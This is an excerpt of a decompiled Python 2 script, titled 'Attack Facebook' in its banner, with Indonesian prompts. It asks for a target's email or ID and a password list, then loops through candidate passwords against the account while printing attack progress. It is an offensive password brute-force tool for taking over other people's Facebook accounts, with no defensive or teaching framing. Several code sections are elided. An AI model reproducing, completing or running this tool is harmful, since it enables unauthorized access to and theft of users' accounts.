...
# Source File : attack.pyc
# Bytecode Version : 2.7
# Time : Sun Aug  9 12:29:16 2020
#---------------------------------------
...
def banner():
    ...
    print '\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90[' + R + 'Attack Facebook' + GL + ']\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
    print ' '

banner()
email_target = str(raw_input(GL + '\x1b[92mMasukkan Email/Id Target =>\x1b[93m  '))
password_list = str(raw_input(GG + 'Ketik coba.txt =>\x1b[93m '))
...
def BLANK(hack_password):
    ...
    try:
        sys.stdout.write(GG + '\n[\x1b[91m+\x1b[92m]\x1b[91;1m [\x1b[97m' + email_target + '\x1b[91m]\x1b[90m Mencoba Serangan ke ==> \x1b[91m[\x1b[90;1m' + hack_password)
        sys.stdout.flush()
        noobs.addheaders = [
...
def runn_noobs():
    ...
    print wd + ' [#] Jumlah Serangan Saat Ini\x1b[97;1m:', len(nuub), 'Serangan'
    print wd + ' [#] Tunggu Proses Attack\x1b[97;1m..........'
    print ' '
